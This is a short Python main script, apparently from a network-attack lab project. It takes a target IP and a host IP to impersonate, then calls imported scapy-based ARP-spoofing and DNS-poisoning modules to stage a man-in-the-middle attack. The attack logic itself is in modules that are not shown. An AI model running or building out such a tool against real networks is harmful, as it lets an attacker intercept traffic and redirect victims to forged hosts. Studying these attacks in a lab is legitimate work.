import sys
from scapy.all import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning

if __name__ == "__main__":
    arguments = sys.argv
    ips = []
    argReq = 3

    if len(sys.argv) != argReq:
        print("Wrong amount of arguments provide", argReq-1, "arguments")
        sys.exit(1)

    for ip in arguments[1:]:
        ips.append(ip)

    print(ips)

    hostToAttack = ips[0]
    hostToSpoof = ips[1]

    arpSpoofing = ArpSpoofing()
    arpSpoof = arpSpoofing.doSpoof(hostToAttack, hostToSpoof)

    dnsPoisoning = DnsPoisoning()
    dnsPoison = dnsPoisoning.doPoison()
